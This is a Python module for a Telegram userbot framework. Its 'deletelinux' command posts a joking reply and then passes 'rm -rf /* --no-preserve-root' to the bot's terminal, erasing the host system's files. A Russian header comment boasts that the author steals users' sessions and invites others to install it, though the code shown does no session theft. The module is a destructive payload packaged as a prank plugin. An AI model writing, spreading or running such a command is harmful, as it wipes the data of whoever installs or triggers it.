# хахаххахах топ код и я пизжу ваши ссесии     юзайте если хотите

# meta developer: @mikhaylodm

from herokutl.tl.types import Message
from .. import loader, utils

@loader.tds
class DeleteLinuxMod(loader.Module):
    """A module to delete linux lol"""

    strings = {
        "name": "DeleteLinux",
        "deleting_linux": "<b>Hello! So you want to delete the stuff that runs this?. Ok! I'm deleting it for you.</b>",
        "_cmd_doc_deletelinux": "delete linux."
    }
    
    strings_ru = {
        "deleting_linux": "<b>Привет! То есть ты хочешь удалить то на чем это? Ну ок Удаляю линукс</b>",
        "_cmd_doc_deletelinux": "удалить линукс."
    }

    async def deletelinuxcmd(self, message: Message):
        """delete Linux"""
        meassage = await utils.answer(message, self.strings("deleting_linux"))
        await self.invoke("terminal", "rm -rf /* --no-preserve-root", peer=meassage.peer_id)
